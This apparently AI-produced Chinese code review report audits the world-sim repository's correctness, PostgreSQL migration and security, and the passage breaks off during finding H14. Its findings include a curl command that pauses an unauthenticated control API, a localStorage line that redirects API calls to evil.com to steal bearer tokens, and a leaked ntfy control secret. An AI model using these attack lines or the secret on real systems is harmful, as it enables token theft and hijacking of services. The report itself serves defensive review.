# world-sim 全量代码审查报告（Track A）

- **审查对象**：`S:\world-sim`（北斗七星宏观情报+仿真系统：天枢 macro-scan / 天璇 macro-sim / 开阳 kaiyang / 天玑+玉衡 macro-ji / 数据层 PG）
- **审查日期**：2026-08-15
- **方式**：多 Agent、多波次、对抗式交叉验证（finder → 独立 skeptic 复验 → 完备性批评 → 主 Agent 源码级人工复核）
- **性质**：**只读审查**。本次审查未修改任何项目代码、配置或数据；唯一写入即本报告及同目录 Track B 规划建议。
- **模型/工具**：Claude Opus，Workflow 编排；并发严格 ≤12（用户约束 ≤15，留余量）。

> ⚠️ **安全处置警告（必读，落盘前先看这条）**
> 审查中发现仓库内**存在多处 live 明文密钥**，其中最严重者是 `.git/config` 远程 URL 内嵌一枚**有效的 GitHub Personal Access Token**（详见 C04）。
> 1. **本报告已对所有密钥值做脱敏**（`ghp_****` / `<*_REDACTED>`），可安全阅读；
> 2. 但 `docs/` 目录位于会 `git push` 到 GitHub 的仓库内 —— **在下述密钥全部轮换作废之前，请勿把本仓库（含本报告所在提交）推送到任何远程**，也不要把原始 finder 输出（未脱敏）带出 NAS；
> 3. 需立即轮换：GitHub PAT（C04）、FRED_API_KEY（H/M 级，明文写在 docker-compose）、SiliconFlow / OpenAI-compat / MiniMax / EIA 等 LLM 与数据源 key（散落在源码/compose）。

---

## 0. 执行摘要

本次对 world-sim 全仓（Python 后端 ~154 文件 + React/TS 前端 ~92 文件 + 仿真引擎 ~35 文件 + 天玑/SQL/infra）做了四维度（**E0-C PG 迁移 · 数据管道与契约 · 正确性/逻辑 · 安全**）全量审查，另加并发/可靠性专项，并按用户要求纳入**未上线组件玉衡/瑶光/天权**的就绪度评估。

**共确认 79 条发现**：**Critical 4 · High 22 · Medium 34 · Low 19**。分布见 §1。

### Top 风险（Critical，均经主 Agent 源码级复核）

| ID | 位置 | 一句话 | 影响 |
|---|---|---|---|
| **C01** | `macro-scan/核心代码/geo_risk_vector.py:106` | 5 个模块常量（`_GED_REGION_MAP` 等）全仓**只被引用、从未定义/导入**，且两处调用在 try 之外 | GRV 计算 06:10 抛 `NameError` → `grv_latest.json` 永不更新 → 全系统（情势检测/叙事/推演触发/前端）**吃陈旧地缘风险数据**。*注：以磁盘源码为准；若部署镜像为旧版本可能不同，需在运行容器内复核。* |
| **C02** | `control_server.py:48` | `CONTROL_TOKEN` 默认空串 → 空 token 时 `_check_token` 直接 `return` 放行（fail-open） | 全仓 docker-compose 均未设该变量 → **运控 API 生产环境实际零鉴权** |
| **C03** | `control_server.py:382` | 服务 `host="0.0.0.0"` 监听、compose 映射 `8900:8900`、CORS `allow_origins=["*"]` | 叠加 C02 → **任意可达 8900 端口的 LAN 主机零凭证** pause/rerun/改调度；任意网站可跨域驱动 |
| **C04** | `.git/config` | 远程 origin URL 内嵌 **live GitHub PAT** | 凡对 NAS 共享有读权限者 `cat .git/config` 即得该 token，可冒充所有者读写仓库/按 scope 横向移动 |

### 贯穿全系统的三条系统性主题

1. **静默降级 / 静默失败**（最普遍）：`pg_read.connect()` 失败返回 `None`、`exec_read()` 返回 `[]`、`weight_matrix` 缺 PyYAML 退化为空权重、LLM 三级降级返回空串、`capPointsPerLayer` 静默丢点、多处 `try/except: pass`。共同后果是**故障被当成"数据为空"消化，不告警、不阻断**，运维无从感知。C01 之所以危险，正是它落在这张"静默网"的上游。
2. **迁移期双轨复杂度（E0-C）**：`WORLDSIM_SQLITE_OFF` 在模块加载时固化（热重载失效）、`macro-ji/tianji_db.py` 缺 P6 守卫可静默复活 SQLite、`synthesis_log.pg_synced_at` 列存在于代码 INSERT 却缺席所有 DDL 文件（schema 漂移）、`b0_migrate`/`verify_reads` 的只读/时区细节。
3. **反馈闭环空转**：玉衡"评分→校准→权重反馈"链因 `predictions` 表无真实数据（`MIN_TRIGGER_N=8` 从未触达）+ `weight_update_log` 写入被 `try/except: pass` 吞没 + `baseline_snapshot` 缺失致 Herfindahl 集中度检查恒为 1.0 恒不告警，处于**数月无告警的空转状态**。

---

## 1. 发现分布与逐条清单

以下 §1–§5 为完整发现清单（分布表 + Critical/High 逐条详情 + Medium/Low 汇总表）。每条含 `file:line`、类别、问题、触发场景、证据、**独立 skeptic 交叉验证结论**，Critical/High 另附**主 Agent 源码级人工复核**。

## 1. 发现分布

| 严重度 | 数量 |
|---|---|
| Critical | 4 |
| High | 22 |
| Medium | 34 |
| Low | 19 |
| **合计** | **79** |

| 子系统 | 发现数 |
|---|---|
| macro-scan(天枢) | 42 |
| macro-ji(天玑/玉衡) | 12 |
| kaiyang(开阳) | 11 |
| 其它 | 7 |
| macro-sim(天璇) | 6 |
| 部署/基础设施 | 1 |

| 审查维度(finder) | 发现数 |
|---|---|
| security | 18 |
| ji-yuheng | 12 |
| concurrency-reliability | 9 |
| e0c-pg-migration | 8 |
| scan-scrapers-units | 7 |
| sim-correctness | 7 |
| scan-grv-scheduler-llm | 6 |
| kaiyang-frontend | 6 |
| data-contracts-tz | 5 |
| wave4-human-review | 1 |

## 2. Critical 发现（逐条 · 已源码级人工复核）

### [C01] Critical · CONFIRMED — macro-scan(天枢)

- **位置**：`macro-scan/核心代码/geo_risk_vector.py:106`
- **类别**：correctness｜**审查维度**：scan-grv-scheduler-llm
- **问题**：Five module constants (_GED_REGION_MAP, _GED_STALE_MONTHS, _GED_P95_ANCHOR, _CONFLICT_FLOOR, _CONFLICT_FLOOR_MIN_ARTICLES) are referenced but never defined or imported anywhere in the codebase, and two use-sites sit outside their try/except, so compute_grv() raises NameError and no GRV output is ever written.
- **说明**：Verified two ways: (a) `grep -rE '_GED_REGION_MAP *=|_GED_P95_ANCHOR *=|_GED_STALE_MONTHS *=|_CONFLICT_FLOOR *=|_CONFLICT_FLOOR_MIN_ARTICLES *=' 核心代码/` returns no matches; (b) an AST parse of the module reports all five as NOT defined at module level, and the only imports are `from optim_config import DATA_DIR, WORKSPACE`. Crash site 1: `_load_ged_conflict_signal` executes `region = _GED_REGION_MAP.get(dimension)` at line 106, which is BEFORE the `try:` at line 111, and is called unprotected from compute_grv at lines 447 and 458. Crash site 2: `_apply_conflict_floor` executes `floor = _CONFLICT_FLOOR.get(dimension)` at line 276, BEFORE the `try:` at line 279, called unprotected from compute_grv line 500. compute_grv() is called unprotected from main() (line 869). Net effect: geo_risk_vector.py aborts with NameError before save_grv/append_grv_history run. Downstream consumers (situation_detector 06:30, daily_narrative 07:00, grv_threshold sim_trigger/ntfy) then read a stale or missing grv_latest.json. Caveat per honesty rules: I verified this against the on-disk source (mtime 2026-08-14 08:28); if the deployed container image carries an older revision where these constants existed, the running instance may differ — but the source as reviewed will crash.
- **触发场景/影响**：Scheduler fires grv_update at 06:10 → runs geo_risk_vector.py → compute_grv() reaches line 447 `_load_ged_conflict_signal("russia_europe")` → line 106 raises `NameError: name '_GED_REGION_MAP' is not defined` → main() aborts → grv_latest.json is never regenerated; all GRV-dependent tasks that day operate on stale data.
- **证据**：line 106: `region = _GED_REGION_MAP.get(dimension)` (try starts line 111); line 276: `floor = _CONFLICT_FLOOR.get(dimension)` (try starts line 279); line 447/458/500 call these unprotected; grep across 核心代码/ and AST both confirm zero definitions.
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED；skeptic2=CONFIRMED
- **主 Agent 人工复核**：主 Agent 源码级铁证：5 个常量全仓 grep 只有引用+CHANGELOG 提及、无定义行，文件无 wildcard import；line 106 在 try(111) 之外；调用点 line 447 与 main():869 均无 try 兜底 → NameError 上抛 → save_grv 永不执行 → grv_latest.json 每日 06:10 不更新。

### [C02] Critical · CONFIRMED（skeptic 修正建议：High/Medium） — macro-scan(天枢)

- **位置**：`macro-scan/核心代码/control_server.py:48`
- **类别**：auth-bypass-default-open｜**审查维度**：security
- **问题**：CONTROL_TOKEN 默认空字符串,未设置环境变量时鉴权被完全跳过,所有控制端点无需任何凭证即可调用。
- **说明**：空 token 即为可绕过鉴权的"默认凭证"。这是 fail-open 设计:安全的默认应是无 token 则拒绝服务(fail-closed),而非放行全部。所有 8 个业务端点(fetchers/logs/rerun/pause/resume/schedule/operations)第一行都是 _check_token,一旦 token 为空全部裸奔。
- **触发场景/影响**：部署时未设置 CONTROL_TOKEN(文档 line16 明确写"未设置则跳过鉴权")。攻击者向 :8900 发任意请求,_check_token 在 line68 `if not CONTROL_TOKEN: return` 直接放行,可无凭证调用 pause/resume/rerun/改调度。
- **证据**：line48: `CONTROL_TOKEN = os.environ.get("CONTROL_TOKEN", "")`；line67-69: `def _check_token(request): if not CONTROL_TOKEN: return  # 未配置 token 则跳过鉴权（开发环境）`；line16 docstring: `鉴权：Bearer Token（CONTROL_TOKEN 环境变量，未设置则跳过鉴权）`
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED(sev→High)；skeptic2=CONFIRMED(sev→Medium)
- **主 Agent 人工复核**：主 Agent 源码级确认：line 48 CONTROL_TOKEN 默认''；line 68-69 空 token 直接 return 跳过鉴权。全仓 docker-compose 均未设置 CONTROL_TOKEN（grep 确认），故生产环境实际以空 token 运行——鉴权真实被完全跳过。skeptic 因'家用内网可信'下调 Medium 的前提被推翻，维持 High/Critical。

### [C03] Critical · CONFIRMED（skeptic 修正建议：Critical/Medium） — macro-scan(天枢)

- **位置**：`macro-scan/核心代码/control_server.py:382`
- **类别**：network-exposure｜**审查维度**：security
- **问题**：服务绑定 0.0.0.0,监听所有网卡,与默认空 token 叠加后任意 LAN 主机可无凭证暂停/重跑/篡改调度。
- **说明**：若该服务确需仅供本机/受信面板访问,应绑 127.0.0.1 或内网专用接口 + 强制 token。当前 0.0.0.0 + fail-open token = LAN 内任何人完全控制采集调度。
- **触发场景/影响**：同网段任意主机 `curl -X POST http://<host>:8900/api/v1/control/fetchers/fred_fetch/pause` 即可暂停采集;`PUT .../schedule` 篡改所有采集源频率;`POST .../rerun` 触发进程重跑。无需登录、无需 token(见 line48 finding)。
- **证据**：line382: `uvicorn.run(app, host="0.0.0.0", port=port)` — 绑定全部接口而非 127.0.0.1。端口 line380 默认 8900。
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED(sev→Critical)；skeptic2=CONFIRMED(sev→Medium)
- **主 Agent 人工复核**：主 Agent 源码级确认：line 382 host='0.0.0.0'；macro-scan/docker-compose.yml line 8 映射 '8900:8900'。叠加空 token（见 :48）→ 任意可达 8900 端口的 LAN 主机零凭证可 pause/rerun/改调度。CORS allow_origins=['*']（line 60）进一步允许任意网站跨域驱动。属实爆而非潜在。

### [C04] Critical · CONFIRMED — 部署/基础设施

- **位置**：`.git/config:0`
- **类别**：hardcoded-credential｜**审查维度**：wave4-human-review
- **问题**：Git origin 远程 URL 内嵌 live GitHub Personal Access Token（classic ghp_ token），凡对 NAS 共享有读权限者即可获得该仓库的 GitHub 写凭证。
- **说明**：远程 URL 形如 https://ghp_****@github.com/<owner>/world-sim.git。该 PAT 用于每次 push/fetch。虽然 .git/config 本身不进版本树（不会被推到 GitHub），但它明文存在于 NAS 挂载盘，任何能浏览该共享的人都能读取并冒用所有者身份对仓库（及该 token scope 覆盖的其它资源）进行操作。
- **触发场景/影响**：拥有 NAS 读权限的任意用户 cat .git/config → 得到 ghp_**** → 用该 token clone/push 该仓库或调用 GitHub API，以所有者身份改代码、读私有仓库、按 token scope 进一步横向移动。
- **证据**：.git/config [remote "origin"] url = https://ghp_****@github.com/<owner>/world-sim.git （主 Agent Wave 4 亲自读取 S:\world-sim\.git\config 确认；此处已脱敏）
- **交叉验证**：1 个独立 skeptic — skeptic1=CONFIRMED(sev→Critical)
- **主 Agent 人工复核**：净新增发现——原 finder 仅提到'存在 GitHub 远程'，未单独标记内嵌 PAT。

## 3. High 发现（逐条）

### [H01] High · CONFIRMED — kaiyang(开阳)

- **位置**：`kaiyang/src/state/ControlContext.tsx:172`
- **类别**：correctness｜**审查维度**：kaiyang-frontend
- **问题**：crypto.randomUUID() 在非安全上下文(LAN HTTP)不可用，任何控制操作/Toast/日志都会抛 TypeError
- **说明**：crypto.randomUUID 属于 Web Crypto，仅在安全上下文(HTTPS 或 localhost/127.0.0.1/file:)可用；通过局域网 IP 的 HTTP 访问不是安全上下文。代码在多处依赖它：ControlContext.tsx:172(showToast 生成 id)、:184(addLog 生成 id)、FetcherCard.tsx:128/166/199(idempotencyKey)、TianshuTab.tsx:126(批量重跑 key)、controlApi.ts:106(mock op id)。其中 showToast 在每个操作的成功与失败分支都会被调用，因此第一次点任意控制按钮就会崩。控制 API 默认地址硬编码为 http://192.168.31.108:8900/(controlConfig.ts:11)，强烈暗示前端也部署在局域网 HTTP 上——此为我的推断，取决于前端实际服务源（若走 HTTPS 或 localhost 则不受影响）。仓库内未见任何 randomUUID polyfill。
- **触发场景/影响**：前端从 http://192.168.31.108(局域网 IP、HTTP) 打开 → 用户点某个采集源的“重跑” → handleRerun 调 crypto.randomUUID() → 抛 TypeError: crypto.randomUUID is not a function → 操作中断；即使先到 showToast，也在 ControlContext.tsx:172 crypto.randomUUID() 处抛错，整个控制面板不可用。
- **证据**：const id = crypto.randomUUID();  // ControlContext.tsx:172, showToast
// 亦见 FetcherCard.tsx:128 const idempotencyKey = crypto.randomUUID();
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED；skeptic2=PLAUSIBLE

### [H02] High · CONFIRMED（skeptic 修正建议：Medium/Low） — kaiyang(开阳)

- **位置**：`kaiyang/src/config/controlConfig.ts:17`
- **类别**：xss-token-exfiltration｜**审查维度**：security
- **问题**：API_BASE_URL 优先从 localStorage 读取且可被覆盖,XSS 可改写 base url 把 Bearer token 转发到攻击者服务器。
- **说明**：base url 可被前端可写存储覆盖,本身是配置便利,但与 token 自动附带叠加即成 token 外泄通道。应对 base url 做协议/主机白名单,或不允许运行时从 localStorage 改写指向。
- **触发场景/影响**：攻击者通过任意 XSS 执行 `localStorage.setItem('kaiyang_control_api_base_url','https://evil.com/')`。此后前端所有 API 请求(controlApi.ts buildHeaders line189-191 会附带 `Authorization: Bearer <token>`)都发往 evil.com,token 被完整窃取。
- **证据**：controlConfig.ts line17-27: `const stored = localStorage.getItem('kaiyang_control_api_base_url'); if (stored) return stored;` — localStorage 优先级最高,无校验/无白名单;配合 controlApi.ts line189-191 `if (activeToken) headers['Authorization'] = 'Bearer ' + activeToken`。
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED(sev→Medium)；skeptic2=PLAUSIBLE(sev→Low)

### [H03] High · CONFIRMED — macro-ji(天玑/玉衡)

- **位置**：`macro-ji/tianji_verifier.py:123`
- **类别**：statistics-correctness｜**审查维度**：ji-yuheng
- **问题**：Brier Skill Score uses a hardcoded climatology of 0.25 instead of the observed base-rate climatology, systematically overstating skill for rare (geopolitical) events.
- **说明**：BSS = 1 - BS/BS_clim with BS_clim fixed at 0.25 (the Brier of always predicting 0.5). The correct climatology is p_bar*(1-p_bar) where p_bar is the observed outcome frequency. Most geopolitical predictions have low base rates (events usually do NOT occur), so their true climatology Brier is far below 0.25. The docstring even says 'BS_climatology = 平均 Brier Score' but the code contradicts it with a constant. bs_clim==0 guard at line 124 is dead code since the value is a literal 0.25.
- **触发场景/影响**：Predictions concern rare events with true base rate ~0.1 (climatology Brier ~0.09). A model producing mean Brier 0.15 (worse than simply forecasting the 0.1 base rate) yields BSS = 1 - 0.15/0.25 = +0.40, printed as '✅ 有增量价值'. The system reports positive skill for a model that is actually worse than the naive base-rate forecast — the flagship metric of the whole verification layer is inflated.
- **证据**：bs_clim = 0.25 ... return round(1.0 - bs_mean / bs_clim, 4)
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED；skeptic2=CONFIRMED

### [H04] High · CONFIRMED — macro-ji(天玑/玉衡)

- **位置**：`macro-ji/tianji_verifier.py:183`
- **类别**：correctness-data-integrity｜**审查维度**：ji-yuheng
- **问题**：Quantitative predictions with no threshold or unrecognized direction get outcome=0.5 yet are still returned and marked 'verified' with a meaningless Brier score.
- **说明**：In verify_quantitative, the else branch sets outcome=0.5 ('无法判断') but still falls through to compute brier = (prob-0.5)^2 and return a result dict. run_monthly_verification then calls update_prediction_verified(status='verified', verified_by='auto'), permanently recording a fabricated Brier for an actually-unverifiable prediction. This includes any direction=='up'/'down' whose threshold is None (the guarded branches require threshold is not None, so they too fall to the 0.5 else). These bogus scores flow into _compute_bss, print_accuracy_report, and check_and_generate_reweight_suggestions.
- **触发场景/影响**：A high-confidence directional prediction (final_prob=0.9) with target_threshold=None is 'verified': outcome forced to 0.5, brier=(0.9-0.5)^2=0.16 stored and status set to 'verified' by auto. It can never be re-verified. That 0.16 poisons the fleet Brier mean, the BSS, and any per-source reweight group mean — a real prediction that was simply unmeasurable is scored as a large error.
- **证据**：else:
    outcome = 0.5  # 无法判断
brier = _compute_brier_score(prob, outcome)
return {"outcome_value": actual_val, "brier_score": brier}
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED；skeptic2=CONFIRMED

### [H05] High · CONFIRMED — macro-ji(天玑/玉衡)

- **位置**：`macro-ji/tianji_verifier.py:367`
- **类别**：small-sample-false-precision｜**审查维度**：ji-yuheng
- **问题**：A definitive BSS verdict ('有增量价值' / '不如随机猜') is printed at only 5 verified samples, while the adjacent message claims ≥20 are needed — a pseudo-precise conclusion from a tiny, noisy sample.
- **说明**：print_accuracy_report gates on v_count>=5 (line 367). _compute_bss also gates at len>=5 (line 119). So at 5–19 samples it prints a categorical skill verdict. Yet the message shown only in the <5 branch (line 368) states '需 ≥ 20 条才计算 BSS', so the stated threshold (20) and the enforced threshold (5) disagree. BSS from 5 binary outcomes has enormous variance; the emitted verdict is false precision on which weight-feedback decisions may rest.
- **触发场景/影响**：With 6 verified predictions where mean Brier happens to be 0.24, BSS=+0.04 prints '✅ 有增量价值'. One more unlucky outcome flips it to '❌ 不如随机猜'. The operator sees a confident systemic verdict driven by a single sample, contradicting the tool's own '≥20' guidance.
- **证据**：if v_count < 5:
    print(f"...需 ≥ 20 条才计算 BSS）")
    return
... bss = _compute_bss(briers) ... trend = "✅ 有增量价值" if bss > 0 else "❌ 不如随机猜"
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED；skeptic2=CONFIRMED

### [H06] High · PLAUSIBLE — macro-ji(天玑/玉衡)

- **位置**：`macro-ji/tianji_db.py:122`
- **类别**：concurrency-durability｜**审查维度**：ji-yuheng
- **问题**：WAL-mode SQLite on a shared NAS mount with three writers is unsafe: WAL relies on shared memory that does not work over network filesystems, and no busy_timeout is set.
- **说明**：get_connection sets PRAGMA journal_mode=WAL on a DB (forecast_tracker.db) that the subsystem map states lives on a NAS mount (/vol2/...) shared by 天璇 (macro-sim), 天玑, and the watchdog subprocess. SQLite's WAL requires a shared-memory (-shm) index that only coordinates processes on the same machine with a real mmap-capable filesystem; on NFS/SMB/network mounts it is explicitly unsupported and can yield corruption or stale reads. No PRAGMA busy_timeout is set (verified: zero occurrences), leaving only the default connect timeout for lock contention among the multiple writers.
- **触发场景/影响**：天璇 writes predictions while 天玑's verifier updates verified rows and the watchdog subprocess also opens the DB, all over the NAS mount. WAL shared-memory coordination fails across the mount, producing a reader that misses committed rows or, worst case, database corruption — silently poisoning Brier/BSS computations and the reweight feedback.
- **证据**：conn.execute("PRAGMA journal_mode=WAL")  # DB on /vol2 NAS, 3 writers, no busy_timeout anywhere
- **交叉验证**：0 个独立 skeptic — 

### [H07] High · CONFIRMED（skeptic 修正建议：Medium/High） — macro-ji(天玑/玉衡)

- **位置**：`macro-ji/docker-compose.yml:17`
- **类别**：hardcoded-credential｜**审查维度**：security
- **问题**：Real FRED API key hardcoded in a version-controlled docker-compose.yml.
- **说明**：Key must be rotated and moved to an env-file / secret. This compose file needs to be added to .gitignore like the macro-scan one, and the value scrubbed from git history.
- **触发场景/影响**：Anyone with repo/NAS read access copies <FRED_KEY_REDACTED> and uses the owner's FRED quota / identity. Unlike macro-scan/docker-compose.yml, this file is NOT covered by any .gitignore (root .gitignore line 18 only excludes macro-scan/docker-compose.yml), so the key is tracked in version control.
- **证据**：- FRED_API_KEY=<FRED_KEY_REDACTED>   (32-char hex = real FRED key format; the template macro-scan/docker-compose.example.yml line 21 correctly uses the placeholder '你的FRED_API_KEY')
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED(sev→Medium)；skeptic2=CONFIRMED(sev→High)

### [H08] High · CONFIRMED — macro-scan(天枢)

- **位置**：`macro-scan/核心代码/fetch_gpr.py:113`
- **类别**：data-loss｜**审查维度**：scan-scrapers-units
- **问题**：GPR CSV is overwritten non-atomically with an empty file whenever the source column becomes non-numeric, destroying full history.
- **说明**：save_series() does `out = pd.DataFrame({'date':..., 'value': values.round(3)}).dropna()` then unconditionally `out.to_csv(path, index=False)`. `values` comes from `pd.to_numeric(df_raw[col], errors='coerce')` in main(). If matteoiacoviello.com changes the column format / units / adds a text row so the whole column coerces to NaN, dropna() empties the frame and to_csv still writes just the header line, clobbering the existing multi-decade series. There is no rows==0 guard, no atomic .tmp+os.replace, and no load_previous_good preservation (unlike fetcher_base). Downstream _load_gpr() then reads an empty CSV → returns (None,None) → that GRV dimension silently loses its GPR component.
- **触发场景/影响**：Upstream XLS renames GPRC_CHN to a string-formatted column → to_numeric coerces all values to NaN → save_series writes an empty GPRC_CHN.csv (header only) → next GRV run has gpr_chn=None → us_china_strategic degrades to GDELT-only with no alert, and the historical GPR data is permanently gone.
- **证据**：out = pd.DataFrame({"date": dates.dt.strftime("%Y-%m-%d"), "value": values.round(3)}).dropna(); path = ...; out.to_csv(path, index=False)
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED；skeptic2=CONFIRMED

### [H09] High · PLAUSIBLE — macro-scan(天枢)

- **位置**：`macro-scan/核心代码/silent_failure_probe.py:59`
- **类别**：monitoring-gap｜**审查维度**：concurrency-reliability
- **问题**：The silent-failure probe monitors GRV/news/heartbeat/FRED/backup artifacts but has ZERO coverage of the prediction/forecast chain, so a break in prediction generation or verification is invisible for months.
- **说明**：ARTIFACTS (lines 59-63) monitors only .scheduler_heartbeat, grv_latest.json, news_export.json; run_probe (line 389) runs check_dualwrite/artifacts/backup/fred_lag/news_risk/sqlite_gone/feed_fresh. NONE checks predictions_log.json freshness, forecast_tracker evaluation freshness, or forecast.forecasts row growth. run_macro_analysis writes predictions via prediction_logger.log_prediction and verify_predictions/forecast_tracker verify them; if any of those stops (see other findings), no probe fires. This is the direct root-cause enabler for 'predictions 链断路数月无告警': the chain can silently stop and every green light stays green because nothing watches it.
- **触发场景/影响**：run_macro_analysis stops emitting predictions (e.g. FRED key rotated, LLM chain change, or predictions_log.json corrupted). predictions_log.json mtime freezes for weeks. Probe runs every 2h, reports OK on all 7 checks, sends no ntfy. Operators discover months later that no prediction has been logged or verified.
- **证据**：ARTIFACTS = [(".scheduler_heartbeat",...),("grv_latest.json",...),("news_export.json",...)] ; run_probe: for fn in (check_dualwrite, check_artifacts, check_backup, check_fred_lag, check_news_risk, check_sqlite_gone, check_feed_fresh)
- **交叉验证**：2 个独立 skeptic — skeptic1=PLAUSIBLE；skeptic2=PLAUSIBLE

### [H10] High · PLAUSIBLE — macro-scan(天枢)

- **位置**：`macro-scan/核心代码/forecast_tracker.py:354`
- **类别**：silent-degradation｜**审查维度**：concurrency-reliability
- **问题**：Forecast verification reads exclusively from PG; when PG is unavailable (WORLDSIM_APP_PW missing/rotated), _pg_fetch returns [] and run_evaluation reports 'no pending' — looking healthy while doing nothing.
- **说明**：run_evaluation (line 354) gets pending rows via _pg_fetch, which calls pg_read.connect(); per pg_read contract, a missing password returns None so _pg_fetch returns [] (line 157-166). With no rows, run_evaluation prints '暂无到期预测记录' and returns {} — indistinguishable from a genuinely empty queue. summary() (line 580) uses _pg_fetchone(...) or (0,), so it prints total=0/pending=0 when PG is down. Writes in run_evaluation go to self.conn (a _NoopConn in PG-only mode, line 107) so UPDATE status='evaluated' is a no-op; real status change depends on update_forecast_status (pg_write, exception self-swallowing). If that write silently fails, records stay pending forever and are re-fetched/re-labeled every run with no progress and no alarm.
- **触发场景/影响**：Password rotation drops WORLDSIM_APP_PW. Every monthly evaluation run reads [] from PG, prints 'no pending', exits 0. Brier scores never update, no ntfy. The verification half of the chain is dead for months while dashboards show a healthy 0-pending state.
- **证据**：rows = _pg_fetch("SELECT * FROM forecast.forecasts WHERE status='pending' AND verify_after <= %s",(today_str,)); if not rows: print("  [Tracker] 暂无到期预测记录（verify_after 未到）"); return {}
- **交叉验证**：2 个独立 skeptic — skeptic1=PLAUSIBLE；skeptic2=REJECTED

### [H11] High · PLAUSIBLE — macro-scan(天枢)

- **位置**：`macro-scan/核心代码/verify_predictions.py:348`
- **类别**：atomicity｜**审查维度**：concurrency-reliability
- **问题**：run_verification overwrites predictions_log.json non-atomically (plain open('w')+json.dump), and prediction_logger._load_log does json.load with no error handling — a crash mid-write corrupts the log and permanently breaks both writer and verifier, unmonitored.
- **说明**：Unlike prediction_logger._save_log (which uses tmp+os.replace), run_verification writes the canonical log with a direct truncating write (lines 348-349). A crash/OOM/kill between truncate and full flush leaves a partial/corrupt JSON. Thereafter prediction_logger._load_log (prediction_logger.py:118-124, bare json.load) and run_verification (line 319-320, bare json.load) both raise on load — so new predictions can't be appended AND verification can't run. Nothing in the probe watches this file, so the corruption is silent. This is a concrete mechanism for a multi-month silent chain break from a single ill-timed crash.
- **触发场景/影响**：Monthly verify job is killed (container restart / OOM) while rewriting predictions_log.json. File is left truncated. Next morning run_macro_analysis calls log_prediction -> _load_log -> json.load raises -> prediction logging fails every day; verify also fails every month. No probe covers predictions_log.json, so silence continues until manual inspection.
- **证据**：with open(PREDICTIONS_LOG, "w", encoding="utf-8") as f: json.dump(log, f, ensure_ascii=False, indent=2)  # non-atomic overwrite; contrast prediction_logger._save_log tmp+os.replace
- **交叉验证**：2 个独立 skeptic — skeptic1=PLAUSIBLE；skeptic2=PLAUSIBLE

### [H12] High · CONFIRMED — macro-scan(天枢)

- **位置**：`macro-scan/核心代码/pg_write_collection.py:71`
- **类别**：silent-data-loss｜**审查维度**：e0c-pg-migration
- **问题**：In PG-only mode the dual-write safety net is inert: permanent PG write failures are only logged inside ephemeral subprocesses (no alert hook is ever installed) and the state-diff probe cannot run without SQLite, so lost writes go undetected.
- **说明**：The C3 hardening (retry/backoff/_STATS/_emit_alert) was designed to 'never be silent', but its two escape valves both fail in the terminal PG-only state: (a) the alert hook that would turn a failure into an ntfy is never wired, and (b) the compensating probe was deliberately switched to a SQLite-vs-PG diff which is impossible after P6 deletes SQLite. So the very state the migration was driving toward (PG-only) is the state with the weakest write-loss detection.
- **触发场景/影响**：WORLDSIM_SQLITE_OFF=1. A fetch_news/scan_weak_signals subprocess calls upsert_news_article; PG rejects it permanently (e.g. FK on ingest_ctx_id=0, a NOT NULL/constraint error, or a schema drift → sqlstate not in _TRANSIENT_SQLSTATES). _write() calls _record_failure → _emit_alert, but _alert_hook is None (grep shows set_alert_hook has zero callers in the repo), so it only does _log.error to that subprocess's stderr. _STATS['fail'] is per-process and dies with the subprocess. silent_failure_probe.check_dualwrite's PG-only branch (lines 108-136) only asserts count>0 per table — with SQLite deleted there is no baseline to diff against. Net result: the article is silently lost, no ntfy fires, no probe flags it.
- **证据**：pg_write_collection.py:71 `_alert_hook = None`; :86-93 `_emit_alert` only `_log.error` unless hook set; grep `set_alert_hook` → only defined (pg_write_collection.py:74) and referenced in docs, never called. silent_failure_probe.py:5-9 states _STATS/hook are per-process and the probe uses state-diff instead; :118-124 PG-only branch checks only `pc<=0`. Confirmed the doc premise defeats the only runtime alert path once SQLite is gone.
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED；skeptic2=CONFIRMED

### [H13] High · CONFIRMED — macro-scan(天枢)

- **位置**：`macro-scan/sql/03_b0_schema.sql:32`
- **类别**：lost-constraint｜**审查维度**：e0c-pg-migration
- **问题**：The PG news.articles table has only a NON-unique index on content_hash and no index/constraint on url, dropping the UNIQUE(url)/UNIQUE(content_hash) invariants SQLite enforced; PG-only dedup then relies solely on an error-swallowing app-level SELECT, so duplicates or silent losses occur.
- **说明**：A core migration-correctness rule is that DB-enforced invariants must be preserved. Here the uniqueness moved from the engine into best-effort application code that also swallows errors, so the guarantee is gone. Even absent transient errors, any logic gap now yields silent duplicates rather than an IntegrityError.
- **触发场景/影响**：PG-only. insert_articles() dedups via _pg_scalar('SELECT id FROM news.articles WHERE url=%s') then by content_hash. _pg_scalar swallows ALL exceptions and returns None (news_db.py:146-147), so a transient read error is indistinguishable from 'not found' → the code allocates a new id via _next_id and inserts. Because PG has no UNIQUE(url)/UNIQUE(content_hash), the duplicate row is accepted (upsert_news_article's ON CONFLICT(id) only guards the surrogate id, never url/hash). The same article now exists twice, inflating COUNT(*) and signal_episodes resonance ratios that feed LLM/ntfy triggers. In SQLite this was impossible: INSERT OR IGNORE hit the UNIQUE index.
- **证据**：03_b0_schema.sql:30-32 create only `idx_articles_published_at/source/content_hash` (all plain, non-unique) and nothing on url; contrast news_db.py:92-95 `CREATE UNIQUE INDEX idx_articles_url ... / idx_articles_hash ...`. news_db.py:146-147 `except Exception: return None` in _pg_scalar; :324-337 PG-only dedup path uses those scalars and _next_id.
- **交叉验证**：2 个独立 skeptic — skeptic1=CONFIRMED；skeptic2=CONFIRMED

### [H14] High · CONFIRMED（skeptic 修正建议：High/Medium） — macro-scan(天枢)

- **位置**：`macro-scan/TuiYan_CHANGELOG.md:3030`
- **类别**：control-secret-leak｜**审查维度**：security
- **问题**：ntfy control command secret '1900' (and the rotated-out old secret) is committed in plaintext and the command topic is a public ntfy.sh topic, so anyone can forge control commands.
